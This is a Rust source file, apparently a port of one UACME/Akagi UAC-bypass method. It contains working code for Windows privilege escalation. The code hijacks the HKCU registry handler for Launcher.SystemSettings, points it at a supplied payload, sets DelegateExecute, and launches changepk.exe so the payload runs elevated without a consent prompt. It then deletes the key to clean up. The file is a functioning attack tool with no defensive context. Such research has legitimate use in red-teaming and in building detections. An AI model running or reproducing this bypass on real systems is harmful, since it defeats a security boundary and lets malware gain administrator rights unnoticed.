// Rinn's UAC bypass methods
// Port of Source/Akagi/methods/rinn.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;

/// Method 61: Shell ChangePk
/// Bypass UAC using changepk.exe
pub fn method_shell_change_pk(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 61] Shell ChangePk");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    change_pk_registry_hijack(&payload_str)
}

/// ChangePk registry hijack
fn change_pk_registry_hijack(payload: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\command
    let reg_path = to_wide_string("Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        let delegate_wide = to_wide_string("DelegateExecute");
        let _ = key.set_string_value(&delegate_wide, &empty_wide);
        
        // Launch changepk.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let changepk = format!("{}changepk.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&changepk), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let launcher_path = to_wide_string("Software\\Classes\\Launcher.SystemSettings");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(launcher_path.as_ptr()));
        
        result
    }
}

